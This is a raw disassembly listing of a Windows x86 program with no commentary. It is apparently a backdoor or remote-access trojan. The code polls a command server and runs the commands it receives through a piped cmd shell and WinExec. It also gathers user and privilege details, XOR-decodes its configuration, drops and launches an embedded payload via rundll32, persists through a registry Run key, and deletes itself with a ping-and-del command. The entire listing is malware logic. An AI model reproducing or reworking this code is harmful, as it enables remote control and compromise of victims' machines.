sub     eax, edx
jz      loc_402313
lea     eax, [esp+494h+processinformation]
push    eax
lea     ecx, [esp+498h+startupinfo]
push    ecx
push    ebp
push    ebp
push    ebp
push    1
push    ebp
push    ebp
lea     edx, [esp+4b4h+commandline]
push    edx
push    ebp
call    ds:createprocessa
push    100000h
call    _malloc
push    100000h
mov     ebx, eax
push    ebp
push    ebx
call    _memset
add     esp, 10h
push    0bb8h
mov     [esp+498h+bytesread], 1
call    ds:sleep
cmp     [esp+494h+bytesread], ebp
jz      short loc_4022e1
cmp     ebp, 0ff800h
jnb     short loc_4022e1
mov     ecx, [esp+494h+hreadpipe]
push    0
push    0
lea     eax, [esp+49ch+bytesread]
push    eax
mov     esi, 100000h
sub     esi, ebp
push    esi
lea     edi, [ebx+ebp]
push    edi
push    ecx
call    ds:peeknamedpipe
mov     eax, [esp+494h+bytesread]
test    eax, eax
jz      short loc_4022e1
push    1
mov     [esp+498h+var_47c], eax
call    ds:sleep
mov     eax, [esp+494h+hreadpipe]
push    0
lea     edx, [esp+498h+bytesread]
push    edx
push    esi
push    edi
push    eax
call    ds:readfile
test    eax, eax
jnz     short loc_4022ce
call    ds:getlasterror
add     ebp, [esp+494h+var_47c]
push    1
call    ds:sleep
cmp     [esp+494h+bytesread], 0
jnz     short loc_402274
push    ebx
mov     eax, ebx
call    sub_401780
mov     eax, ebx
add     esp, 4
lea     edx, [eax+1]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_4022f1
sub     eax, edx
push    1
add     eax, 0ah
push    eax
push    ebx
mov     ecx, offset byte_414774
call    sub_4018e0
add     esp, 0ch
movzx   esi, al
jmp     short loc_402319
mov     ebx, [esp+494h+var_47c]
xor     esi, esi
push    ebx
call    _free
add     esp, 4
test    esi, esi
setnz   al
mov     ecx, [esp+494h+var_8]
pop     edi
pop     esi
pop     ebp
pop     ebx
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 484h
retn
sub     esp, 1e4h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+1e4h+var_8], eax
push    94h
lea     eax, [esp+1e8h+var_1d0]
push    0
push    eax
mov     [esp+1f0h+var_1d4], 0
call    _memset
mov     ecx, lpszservername
mov     edx, [ecx+19ch]
add     esp, 0ch
mov     [esp+1e4h+var_1d0], edx
call    sub_401000
mov     [esp+1e4h+var_1d4], eax
call    sub_402ab0
movzx   eax, al
push    0
mov     [esp+1e8h+var_1cc], eax
call    __time64
add     esp, 4
add     eax, 7080h
lea     ecx, [esp+1e4h+time]
adc     edx, 0
push    ecx
mov     dword ptr [esp+1e8h+time], eax
mov     dword ptr [esp+1e8h+time+4], edx
call    __gmtime64
mov     edx, [eax+14h]
mov     [esp+1e8h+var_1c8], edx
mov     ecx, [eax+10h]
inc     ecx
mov     [esp+1e8h+var_1c4], ecx
mov     edx, [eax+0ch]
mov     [esp+1e8h+var_1c0], edx
mov     ecx, [eax+8]
mov     [esp+1e8h+var_1bc], ecx
mov     edx, [eax+4]
mov     [esp+1e8h+var_1b8], edx
mov     eax, [eax]
add     esp, 4
mov     [esp+1e4h+var_1b4], eax
call    ds:isuseranadmin
test    eax, eax
jz      short loc_4023f7
mov     eax, 1
jmp     short loc_402423
call    sub_401000
cmp     eax, 4
jge     short loc_402408
mov     eax, 3
jmp     short loc_402423
call    sub_4031d0
cmp     eax, 1
jnz     short loc_402419
mov     eax, 2
jmp     short loc_402423
neg     eax
sbb     eax, eax
and     eax, 0fffffffdh
add     eax, 3
push    12bh
lea     ecx, [esp+1e8h+var_13b]
push    0
push    ecx
mov     [esp+1f0h+var_1b0], eax
mov     [esp+1f0h+buffer], 0
call    _memset
add     esp, 0ch
lea     edx, [esp+1e4h+pcbbuffer]
push    edx
lea     eax, [esp+1e8h+buffer]
push    eax
mov     [esp+1ech+pcbbuffer], 12ch
call    ds:getusernamea
test    eax, eax
jnz     short loc_402477
push    64h
push    eax
lea     ecx, [esp+1ech+var_1ac]
push    ecx
call    _memset
add     esp, 0ch
jmp     short loc_402493
lea     edx, [esp+1e4h+buffer]
push    edx
lea     eax, [esp+1e8h+var_1ac]
mov     [esp+1e8h+var_114], 0
call    sub_401780
add     esp, 4
mov     eax, dword_413190
mov     ecx, dword_413194
mov     edx, dword_413198
push    0
mov     [esp+1e8h+var_148], eax
lea     eax, [esp+1e8h+var_1d4]
mov     [esp+1e8h+var_144], ecx
push    98h
push    eax
mov     ecx, offset byte_414774
mov     [esp+1f0h+var_140], edx
call    sub_4018e0
mov     ecx, [esp+1f0h+var_8]
add     esp, 0ch
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 1e4h
retn
sub     esp, 20ch
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+20ch+var_4], eax
push    207h
lea     eax, [esp+210h+var_20b]
push    0
push    eax
mov     [esp+218h+filename], 0
call    _memset
lea     ecx, [esp+218h+filename]
push    ecx
mov     eax, esi
call    sub_401820
add     esp, 10h
lea     ecx, [esp+20ch+filename]
call    sub_401ef0
mov     ecx, [esp+20ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 20ch
retn
sub     esp, 388h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+388h+var_4], eax
push    383h
lea     eax, [esp+38ch+var_387]
push    0
push    eax
mov     [esp+394h+filename], 0
call    _memset
add     esp, 0ch
call    ds:getcurrentprocessid
push    eax
lea     ecx, [esp+38ch+filename]
push    offset aselfprocessidd
push    ecx
call    _sprintf
lea     eax, [esp+394h+filename]
add     esp, 0ch
lea     edx, [eax+1]
lea     ecx, [ecx+0]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_4025a0
sub     eax, edx
push    104h
lea     edx, [esp+eax+38ch+filename]
push    edx
push    0
call    ds:getmodulefilenamea
lea     eax, [esp+388h+filename]
push    eax
lea     eax, [esp+38ch+var_25c]
call    sub_401780
push    1
lea     ecx, [esp+390h+var_25c]
push    258h
push    ecx
mov     ecx, offset byte_414774
call    sub_4018e0
mov     ecx, [esp+398h+var_4]
add     esp, 10h
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 388h
retn
sub     esp, 28h
push    esi
mov     esi, eax
cmp     byte ptr [esi], 0
mov     [esp+2ch+var_25], 0
jnz     loc_4026a1
mov     eax, processinformation.dwprocessid
test    eax, eax
jz      short loc_40269a
push    eax
push    0
push    1
call    ds:openprocess
test    eax, eax
jz      short loc_402635
push    0
push    eax
call    ds:terminateprocess
mov     eax, hreadpipe
mov     esi, ds:closehandle
push    eax
call    esi
mov     ecx, dword_4147a8
push    ecx
call    esi
mov     edx, hnamedpipe
push    edx
call    esi
mov     eax, hfile
push    eax
call    esi
or      eax, 0ffffffffh
mov     hfile, eax
mov     hnamedpipe, eax
mov     dword_4147a8, eax
mov     hreadpipe, eax
xor     eax, eax
push    44h
push    eax
push    offset startupinfo
mov     processinformation.hprocess, eax
mov     processinformation.hthread, eax
mov     processinformation.dwprocessid, eax
mov     processinformation.dwthreadid, eax
call    _memset
add     esp, 0ch
mov     al, 1
pop     esi
add     esp, 28h
retn
push    ebx
push    ebp
xor     ebp, ebp
push    edi
lea     edi, [ebp+1]
cmp     processinformation.dwprocessid, ebp
jnz     loc_40277c
mov     ebx, ds:createpipe
xor     eax, eax
push    ebp
lea     ecx, [esp+3ch+pipeattributes]
push    ecx
mov     [esp+40h+pipeattributes.lpsecuritydescriptor], eax
mov     [esp+40h+pipeattributes.binherithandle], eax
mov     [esp+40h+var_c.lpsecuritydescriptor], eax
mov     [esp+40h+var_c.binherithandle], eax
mov     eax, 0ch
push    offset hfile
push    offset hreadpipe
mov     [esp+48h+pipeattributes.nlength], eax
mov     [esp+48h+pipeattributes.lpsecuritydescriptor], ebp
mov     [esp+48h+pipeattributes.binherithandle], edi
mov     [esp+48h+var_c.nlength], eax
mov     [esp+48h+var_c.lpsecuritydescriptor], ebp
mov     [esp+48h+var_c.binherithandle], edi
call    ebx
test    eax, eax
jz      short loc_40276d
push    ebp
lea     edx, [esp+3ch+var_c]
push    edx
push    offset dword_4147a8
push    offset hnamedpipe
call    ebx
test    eax, eax
jz      short loc_40276d
push    offset startupinfo
call    ds:getstartupinfoa
mov     eax, hreadpipe
push    offset processinformation
push    offset startupinfo
push    ebp
push    ebp
push    ebp
push    edi
push    ebp
push    ebp
mov     startupinfo.hstdinput, eax
mov     eax, dword_4147a8
push    ebp
xor     ecx, ecx
push    offset applicationname
mov     startupinfo.dwflags, 101h
mov     startupinfo.hstderror, eax
mov     startupinfo.hstdoutput, eax
mov     startupinfo.wshowwindow, cx
call    ds:createprocessa
test    eax, eax
jnz     short loc_402777
pop     edi
pop     ebp
pop     ebx
xor     al, al
pop     esi
add     esp, 28h
retn
mov     [esp+38h+var_25], 1
push    esi
mov     eax, esi
call    sub_401820
mov     eax, esi
add     esp, 4
mov     [esp+38h+numberofbyteswritten], ebp
lea     edx, [eax+1]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_402790
sub     eax, edx
push    ebp
lea     edx, [esp+3ch+numberofbyteswritten]
push    edx
push    eax
mov     eax, hfile
push    esi
mov     esi, ds:writefile
push    eax
call    esi
mov     edx, hfile
push    ebp
lea     ecx, [esp+3ch+numberofbyteswritten]
push    ecx
push    2
push    offset asc_410578
push    edx
call    esi
push    100000h
call    _malloc
push    100000h
mov     ebx, eax
push    ebp
push    ebx
call    _memset
add     esp, 10h
cmp     [esp+38h+var_25], 0
jz      short loc_40280a
mov     eax, processinformation.dwprocessid
push    eax
push    offset acreatechildcmd
push    ebx
call    _sprintf
mov     ebp, ebx
add     esp, 0ch
lea     ecx, [ebp+1]
mov     al, [ebp+0]
inc     ebp
test    al, al
jnz     short loc_402800
sub     ebp, ecx
push    0bb8h
mov     [esp+3ch+bytesread], edi
mov     [esp+3ch+var_25], 0
call    ds:sleep
cmp     [esp+38h+bytesread], 0
jz      loc_4028b7
lea     esp, [esp+0]
cmp     ebp, 0ff800h
jnb     short loc_4028b7
mov     edx, hnamedpipe
push    0
push    0
lea     ecx, [esp+40h+bytesread]
push    ecx
mov     esi, 100000h
sub     esi, ebp
push    esi
lea     edi, [ebx+ebp]
push    edi
push    edx
call    ds:peeknamedpipe
mov     eax, [esp+38h+bytesread]
test    eax, eax
jnz     short loc_402874
cmp     [esp+38h+var_25], al
jnz     short loc_4028b7
mov     [esp+38h+var_25], 1
push    0bb8h
jmp     short loc_4028a6
push    1
mov     [esp+3ch+var_1c], eax
call    ds:sleep
mov     ecx, hnamedpipe
push    0
lea     eax, [esp+3ch+bytesread]
push    eax
push    esi
push    edi
push    ecx
call    ds:readfile
test    eax, eax
jnz     short loc_4028a0
call    ds:getlasterror
add     ebp, [esp+38h+var_1c]
push    1
call    ds:sleep
cmp     [esp+38h+bytesread], 0
jnz     loc_402830
push    ebx
mov     eax, ebx
call    sub_401780
mov     eax, ebx
add     esp, 4
lea     edx, [eax+1]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_4028c7
sub     eax, edx
push    8
add     eax, 0ah
push    eax
push    ebx
mov     ecx, offset byte_414774
call    sub_4018e0
push    ebx
movzx   esi, al
call    _free
add     esp, 10h
pop     edi
pop     ebp
test    esi, esi
pop     ebx
setnz   al
pop     esi
add     esp, 28h
retn
push    ebp
mov     ebp, esp
and     esp, 0fffffff8h
sub     esp, 8
cmp     dword_4131a0, 0
push    ebx
push    ebp
mov     ebp, ds:sleep
push    esi
push    edi
jz      short loc_402923
push    0ea60h
call    ebp
xor     eax, eax
mov     [esp+18h+phkresult], 0
call    sub_401420
call    sub_402340
test    al, al
jnz     short loc_402991
xor     esi, esi
lea     ecx, [ecx+0]
call    ds:gettickcount
xor     edx, edx
mov     ecx, 14h
div     ecx
add     edx, 0fh
imul    edx, 3e8h
push    edx
call    ebp
call    sub_402340
cmp     al, 1
jz      short loc_402991
inc     esi
cmp     esi, 3
jl      short loc_402940
mov     eax, dword_4147a0
inc     eax
mov     dword_4147a0, eax
call    sub_401420
test    al, al
jnz     short loc_402932
push    36ee80h
mov     dword_4147a0, 0
call    ebp
jmp     short loc_402932
lea     ebx, [esp+18h+phkresult]
call    sub_401b80
mov     edi, eax
test    edi, edi
jnz     short loc_4029b1
mov     edx, lpszservername
mov     eax, [edx+19ch]
push    eax
call    ebp
jmp     short loc_402932
mov     eax, [edi]
dec     eax
lea     esi, [edi+18h]
cmp     eax, 7
ja      def_4029c0
jmp     ds:jpt_4029c0[eax*4]
mov     ecx, esi
call    sub_4020f0
jmp     loc_402a6f
call    sub_401dd0
jmp     loc_402a6f
call    sub_4024f0
jmp     loc_402a6f
push    0
push    esi
call    ds:winexec
jmp     short loc_402a6f
mov     esi, [esi]
lea     ecx, [esi-3e9h]
cmp     ecx, 83d216h
ja      short loc_402a6f
mov     edx, lpszservername
mov     [edx+19ch], esi
jmp     short loc_402a6f
cmp     dword ptr [esi], 378h
jnz     short loc_402a6f
lea     edx, [esp+18h+phkresult]
push    edx
push    offset subkey
push    80000001h
call    ds:regopenkeya
test    eax, eax
jz      short loc_402a41
mov     eax, [esp+18h+phkresult]
push    offset valuename
push    eax
call    ds:regdeletekeya
mov     ecx, [esp+18h+phkresult]
push    ecx
call    ds:regclosekey
call    sub_403360
call    sub_402550
jmp     short loc_402a6f
mov     eax, esi
call    sub_402600
jmp     short loc_402a6f
mov     eax, lpszservername
mov     ecx, [eax+19ch]
push    ecx
call    ebp
push    3e8h
call    ebp
push    edi
call    _free
add     esp, 4
jmp     loc_402932
push    ebp
mov     ebp, esp
and     esp, 0fffffff8h
sub     esp, 254h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+254h+var_4], eax
push    ebx
xor     ebx, ebx
push    103h
lea     eax, [esp+25ch+var_10f]
push    ebx
push    eax
mov     [esp+264h+buffer], bl
call    _memset
add     esp, 0ch
push    104h
lea     ecx, [esp+25ch+buffer]
push    ecx
call    ds:getsystemdirectorya
lea     eax, [esp+258h+buffer]
mov     [esp+258h+var_10d], bl
dec     eax
lea     esp, [esp+0]
mov     cl, [eax+1]
inc     eax
cmp     cl, bl
jnz     short loc_402b10
mov     edx, ds:dword_4105bc
mov     ecx, ds:dword_4105c0
mov     [eax], edx
mov     edx, ds:dword_4105c4
mov     [eax+4], ecx
mov     ecx, ds:dword_4105c8
mov     [eax+8], edx
mov     edx, ds:dword_4105cc
mov     [eax+0ch], ecx
mov     [eax+10h], edx
lea     eax, [esp+258h+findfiledata]
push    eax
lea     ecx, [esp+25ch+buffer]
push    ecx
call    ds:findfirstfilea
cmp     eax, 0ffffffffh
jz      short loc_402b65
test    byte ptr [esp+258h+findfiledata.dwfileattributes], 10h
jz      short loc_402b65
mov     bl, 1
push    eax
call    ds:findclose
mov     ecx, [esp+258h+var_4]
mov     al, bl
pop     ebx
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
sub     esp, 348h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+348h+var_4], eax
call    ds:isuseranadmin
test    eax, eax
jz      short loc_402bc5
mov     al, 1
mov     ecx, [esp+348h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 348h
retn
call    sub_401000
cmp     eax, 5
jz      short loc_402beb
cmp     eax, 7
jz      short loc_402beb
xor     al, al
mov     ecx, [esp+348h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 348h
retn
call    sub_4031d0
cmp     eax, 1
jnz     short loc_402bd4
push    esi
push    103h
lea     eax, [esp+350h+var_23f]
push    0
push    eax
mov     [esp+358h+filename], 0
call    _memset
add     esp, 0ch
push    104h
lea     ecx, [esp+350h+filename]
push    ecx
push    0
call    ds:getmodulefilenamea
push    103h
lea     edx, [esp+350h+var_343]
push    0
push    edx
mov     [esp+358h+buffer], 0
call    _memset
add     esp, 0ch
lea     eax, [esp+34ch+buffer]
push    eax
push    104h
call    ds:gettemppatha
lea     esi, [esp+34ch+buffer]
lea     ecx, [esi+1]
lea     ebx, [ebx+0]
mov     al, [esi]
inc     esi
test    al, al
jnz     short loc_402c60
push    ebx
push    ebp
sub     esi, ecx
push    edi
lea     edi, [esi+8]
cmp     esi, edi
jge     short loc_402c9b
mov     ebp, ds:gettickcount
mov     ebx, ds:sleep
nop
call    ebp
xor     edx, edx
mov     ecx, 1ah
div     ecx
push    1
add     dl, 61h
mov     [esp+esi+35ch+buffer], dl
call    ebx
inc     esi
cmp     esi, edi
jl      short loc_402c80
lea     eax, [esp+358h+buffer]
dec     eax
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_402ca0
mov     edx, ds:dword_4105d0
mov     cl, ds:byte_4105d4
mov     [eax], edx
mov     [eax+4], cl
call    sub_402ab0
xor     edx, edx
mov     bl, al
test    bl, bl
setnz   dl
push    offset type
add     edx, 65h
push    edx
push    0
call    ds:findresourcea
mov     esi, eax
push    esi
push    0
call    ds:loadresource
push    eax
call    ds:lockresource
push    esi
push    0
mov     edi, eax
call    ds:sizeofresource
mov     esi, eax
push    esi
call    _malloc
push    esi
mov     ebp, eax
push    edi
push    ebp
call    _memcpy
add     esp, 10h
xor     ecx, ecx
test    esi, esi
jle     short loc_402d25
mov     al, [ecx+ebp]
test    al, al
jz      short loc_402d20
cmp     al, 24h
jz      short loc_402d20
xor     al, 24h
mov     [ecx+ebp], al
inc     ecx
cmp     ecx, esi
jl      short loc_402d10
xor     ecx, ecx
test    esi, esi
jbe     short loc_402d53
jmp     short loc_402d30
cmp     byte ptr [ecx+ebp], 41h
lea     edx, [ecx+ebp]
jnz     short loc_402d4e
xor     eax, eax
jmp     short loc_402d40
cmp     byte ptr [edx+eax], 41h
jnz     short loc_402d4e
inc     eax
cmp     eax, 1eh
jl      short loc_402d40
jmp     short loc_402d53
inc     ecx
cmp     ecx, esi
jb      short loc_402d30
lea     eax, [esi-1]
cmp     ecx, eax
jnb     short loc_402d96
lea     eax, [esp+358h+filename]
mov     edx, eax
sub     ecx, edx
lea     edx, [ecx+ebp]
mov     cl, [eax]
mov     [edx+eax], cl
inc     eax
test    cl, cl
jnz     short loc_402d68
push    0
push    80h
push    2
push    0
push    2
push    40000000h
lea     eax, [esp+370h+buffer]
push    eax
call    ds:createfilea
mov     edi, eax
cmp     edi, 0ffffffffh
jnz     short loc_402db1
mov     ecx, [esp+358h+var_4]
pop     edi
pop     ebp
pop     ebx
pop     esi
xor     ecx, esp
xor     al, al
call    @__security_check_cookie@4
add     esp, 348h
retn
push    0
lea     ecx, [esp+35ch+numberofbyteswritten]
push    ecx
push    esi
push    ebp
push    edi
mov     [esp+36ch+numberofbyteswritten], 0
call    ds:writefile
push    edi
call    ds:closehandle
push    135h
lea     edx, [esp+35ch+var_13b]
push    0
push    edx
mov     [esp+364h+cmdline], 0
call    _memset
lea     eax, [esp+364h+buffer]
push    eax
lea     ecx, [esp+368h+cmdline]
push    offset acmdexecrundll3
push    ecx
call    _sprintf
lea     eax, [esp+370h+cmdline]
add     esp, 18h
dec     eax
test    bl, bl
jz      short loc_402e30
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_402e12
mov     edx, ds:dword_4105f8
mov     ecx, ds:dword_4105fc
mov     [eax], edx
mov     [eax+4], ecx
jmp     short loc_402e54
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_402e30
mov     edx, ds:dword_410600
mov     ecx, ds:dword_410604
mov     [eax], edx
mov     dx, ds:word_410608
mov     [eax+4], ecx
mov     [eax+8], dx
push    0
lea     eax, [esp+35ch+cmdline]
push    eax
call    ds:winexec
push    0
call    ds:exitprocess
push    ebp
mov     ebp, [esp+4+filename]
push    offset ar
push    ebp
call    _fopen
add     esp, 8
test    eax, eax
jz      short loc_402e94
push    eax
call    _fclose
add     esp, 4
xor     al, al
pop     ebp
retn
mov     eax, [esp+4+arg_0]
push    esi
push    offset mode
push    eax
call    _fopen
mov     esi, eax
add     esp, 8
test    esi, esi
jnz     short loc_402eb2
pop     esi
xor     al, al
pop     ebp
retn
push    ebx
push    edi
push    2
push    0
push    esi
call    _fseek
push    esi
call    _ftell
push    0
push    0
push    esi
mov     edi, eax
call    _fseek
push    edi
call    _malloc
push    esi
push    1
mov     ebx, eax
push    edi
push    ebx
call    _fread
push    esi
call    _fclose
add     esp, 34h
call    ds:gettickcount
push    offset awb
push    ebp
mov     [ebx+edi-8], eax
call    _fopen
mov     esi, eax
push    esi
push    1
push    edi
push    ebx
call    _fwrite
push    esi
call    _fclose
add     esp, 1ch
pop     edi
pop     ebx
pop     esi
mov     al, 1
pop     ebp
retn
sub     esp, 318h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+318h+var_4], eax
push    103h
lea     eax, [esp+31ch+var_30f]
push    0
push    eax
mov     [esp+324h+dst], 0
call    _memset
push    103h
lea     ecx, [esp+328h+var_20b]
push    0
push    ecx
mov     [esp+330h+filename], 0
call    _memset
push    103h
lea     edx, [esp+334h+var_107]
push    0
push    edx
mov     [esp+33ch+pathname], 0
call    _memset
add     esp, 24h
call    sub_402b90
mov     [esp+318h+var_315], al
xor     eax, eax
mov     cl, byte ptr ax9793x59[eax]
test    cl, cl
jz      short loc_402fa8
cmp     cl, 56h
jz      short loc_402fa8
xor     cl, 56h
mov     byte ptr ax9793x59[eax], cl
mov     cl, [eax+413001h]
test    cl, cl
jz      short loc_402fc0
cmp     cl, 56h
jz      short loc_402fc0
xor     cl, 56h
mov     [eax+413001h], cl
mov     cl, [eax+413002h]
test    cl, cl
jz      short loc_402fd8
cmp     cl, 56h
jz      short loc_402fd8
xor     cl, 56h
mov     [eax+413002h], cl
mov     cl, [eax+413003h]
test    cl, cl
jz      short loc_402ff0
cmp     cl, 56h
jz      short loc_402ff0
xor     cl, 56h
mov     [eax+413003h], cl
mov     cl, [eax+413004h]
test    cl, cl
jz      short loc_403008
cmp     cl, 56h
jz      short loc_403008
xor     cl, 56h
mov     [eax+413004h], cl
mov     cl, [eax+413005h]
test    cl, cl
jz      short loc_403020
cmp     cl, 56h
jz      short loc_403020
xor     cl, 56h
mov     [eax+413005h], cl
add     eax, 6
cmp     eax, 9d8h
jl      loc_402f90
push    104h
lea     eax, [esp+31ch+dst]
push    eax
push    offset src
call    ds:expandenvironmentstringsa
test    eax, eax
jz      loc_4031aa
xor     eax, eax
lea     ecx, [ecx+0]
mov     cl, [esp+eax+318h+dst]
mov     [esp+eax+318h+pathname], cl
inc     eax
test    cl, cl
jnz     short loc_403050
push    edi
lea     edi, [esp+31ch+dst]
dec     edi
mov     al, [edi+1]
inc     edi
test    al, al
jnz     short loc_403066
mov     cx, ds:word_410610
push    104h
lea     edx, [esp+320h+filename]
push    edx
push    0
mov     [edi], cx
call    ds:getmodulefilenamea
test    eax, eax
jz      loc_4031a9
mov     eax, offset word_4130fa
mov     edx, eax
lea     esp, [esp+0]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_4030a0
lea     edi, [esp+31ch+dst]
sub     eax, edx
dec     edi
mov     edi, edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_4030b0
push    esi
mov     ecx, eax
shr     ecx, 2
mov     esi, edx
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     ecx, [esp+320h+filename]
lea     eax, [esp+320h+dst]
pop     esi
mov     dl, [eax]
cmp     dl, [ecx]
jnz     short loc_4030f5
test    dl, dl
jz      short loc_4030f1
mov     dl, [eax+1]
cmp     dl, [ecx+1]
jnz     short loc_4030f5
add     eax, 2
add     ecx, 2
test    dl, dl
jnz     short loc_4030d5
xor     eax, eax
jmp     short loc_4030fa
sbb     eax, eax
sbb     eax, 0ffffffffh
test    eax, eax
jz      loc_4031a9
push    0
lea     eax, [esp+320h+pathname]
push    eax
call    ds:createdirectorya
lea     ecx, [esp+31ch+dst]
push    ecx
lea     edx, [esp+320h+filename]
push    edx
call    sub_402e70
add     esp, 8
cmp     [esp+31ch+var_315], 0
jz      short loc_40313f
lea     eax, [esp+31ch+phkresult]
push    eax
push    offset subkey
push    80000002h
jmp     short loc_40314e
lea     ecx, [esp+31ch+phkresult]
push    ecx
push    offset subkey
push    80000001h
call    ds:regopenkeya
lea     eax, [esp+31ch+dst]
lea     edx, [eax+1]
jmp     short loc_403160
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_403160
sub     eax, edx
push    eax
mov     eax, [esp+320h+phkresult]
lea     edx, [esp+320h+dst]
push    edx
push    1
push    0
push    offset valuename
push    eax
call    ds:regsetvalueexa
mov     ecx, [esp+31ch+phkresult]
push    ecx
call    ds:regclosekey
cmp     dword_4131a0, 0
jnz     short loc_4031a4
push    0
lea     edx, [esp+320h+dst]
push    edx
call    ds:winexec
call    sub_403360
pop     edi
mov     ecx, [esp+318h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 318h
retn
call    sub_402f20
call    sub_402900
sub     esp, 20h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+20h+var_4], eax
push    ebx
push    ebp
push    esi
xor     esi, esi
push    edi
mov     [esp+30h+var_20], esi
mov     [esp+30h+tokenhandle], esi
mov     [esp+30h+psid], esi
mov     [esp+30h+returnlength], esi
mov     [esp+30h+pidentifierauthority.value], 0
mov     [esp+30h+pidentifierauthority.value+1], 0
mov     [esp+30h+pidentifierauthority.value+2], 0
mov     [esp+30h+pidentifierauthority.value+3], 0
mov     [esp+30h+pidentifierauthority.value+4], 0
mov     [esp+30h+pidentifierauthority.value+5], 5
call    ds:getcurrentprocessid
push    eax
push    esi
push    1fffffh
call    ds:openprocess
mov     ebx, eax
mov     [esp+30h+var_1c], ebx
cmp     ebx, esi
jz      loc_4032f3
or      edi, 0ffffffffh
cmp     ebx, edi
jz      loc_4032f3
lea     eax, [esp+30h+tokenhandle]
push    eax
push    0f01ffh
push    ebx
call    ds:openprocesstoken
test    eax, eax
jnz     short loc_40325c
mov     [esp+30h+var_20], edi
jmp     loc_4032fb
lea     ecx, [esp+30h+psid]
push    ecx
push    esi
push    esi
push    esi
push    esi
push    esi
push    esi
push    220h
push    20h
push    2
lea     edx, [esp+58h+pidentifierauthority]
push    edx
call    ds:allocateandinitializesid
test    eax, eax
jnz     short loc_403285
mov     [esp+30h+var_20], edi
jmp     short loc_4032fb
push    400h
call    _malloc
push    400h
mov     edi, eax
push    esi
push    edi
call    _memset
mov     ecx, [esp+40h+tokenhandle]
add     esp, 10h
lea     eax, [esp+30h+returnlength]
push    eax
push    400h
push    edi
push    2
push    ecx
call    ds:gettokeninformation
mov     ebp, [edi]
cmp     ebp, esi
jle     short loc_4032ff
lea     ebx, [edi+4]
mov     edx, [ebx]
mov     eax, [esp+30h+psid]
push    edx
push    eax
call    ds:equalsid
test    eax, eax
jnz     short loc_4032e3
inc     esi
add     ebx, 8
cmp     esi, ebp
jl      short loc_4032c1
mov     ebx, [esp+30h+var_1c]
xor     esi, esi
jmp     short loc_4032ff
mov     ebx, [esp+30h+var_1c]
mov     [esp+30h+var_20], 1
xor     esi, esi
jmp     short loc_4032ff
mov     [esp+30h+var_20], 0ffffffffh
mov     edi, [esp+30h+var_1c]
cmp     edi, esi
jz      short loc_40330c
push    edi
call    _free
add     esp, 4
mov     eax, [esp+30h+psid]
cmp     eax, esi
jz      short loc_40331b
push    eax
call    ds:freesid
mov     edi, ds:closehandle
cmp     ebx, esi
jz      short loc_40332d
cmp     ebx, 0ffffffffh
jz      short loc_40332d
push    ebx
call    edi
mov     eax, [esp+30h+tokenhandle]
cmp     eax, esi
jz      short loc_40333d
cmp     eax, 0ffffffffh
jz      short loc_40333d
push    eax
call    edi
mov     ecx, [esp+30h+var_4]
mov     eax, [esp+30h+var_20]
pop     edi
pop     esi
pop     ebp
pop     ebx
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 20h
retn
sub     esp, 114h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+114h+var_4], eax
push    100h
call    ds:getcurrentprocess
push    eax
call    ds:setpriorityclass
push    0fh
call    ds:getcurrentthread
push    eax
call    ds:setthreadpriority
mov     eax, dwitem1
push    0
push    eax
push    1
push    4
call    ds:shchangenotify
mov     ecx, dwitem1
push    ecx
lea     edx, [esp+118h+parameters]
push    offset acping127001del
push    edx
call    _sprintf
add     esp, 0ch
push    0
push    0
lea     eax, [esp+11ch+parameters]
push    eax
push    offset file
push    offset operation
push    0
call    ds:shellexecutea
push    0
call    ds:exitprocess
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_413d64, eax
pop     ebp
retn
push    esi
push    4
push    20h
call    __calloc_crt
mov     esi, eax
push    esi
call    __encode_pointer
add     esp, 0ch
mov     dword_415970, eax
mov     dword_41596c, eax
test    esi, esi
jnz     short loc_40626f
push    18h
pop     eax
pop     esi
retn
and     dword ptr [esi], 0
xor     eax, eax
pop     esi
retn
mov     edi, edi
push    esi
mov     eax, offset dword_4106e0
mov     esi, offset dword_4106e0
push    edi
mov     edi, eax
cmp     eax, esi
jnb     short loc_4062ec
mov     eax, [edi]
test    eax, eax
jz      short loc_4062e5
call    eax
add     edi, 4
cmp     edi, esi
jb      short loc_4062dd
pop     edi
pop     esi
retn
mov     edi, edi
push    esi
mov     eax, offset dword_4106e8
mov     esi, offset dword_4106e8
push    edi
mov     edi, eax
cmp     eax, esi
jnb     short loc_406312
mov     eax, [edi]
test    eax, eax
jz      short loc_40630b
call    eax
add     edi, 4
cmp     edi, esi
jb      short loc_406303
pop     edi
pop     esi
retn
push    dword_4141ec
call    __decode_pointer
pop     ecx
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_4141f8, eax
pop     ebp
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_414204, eax
pop     ebp
retn
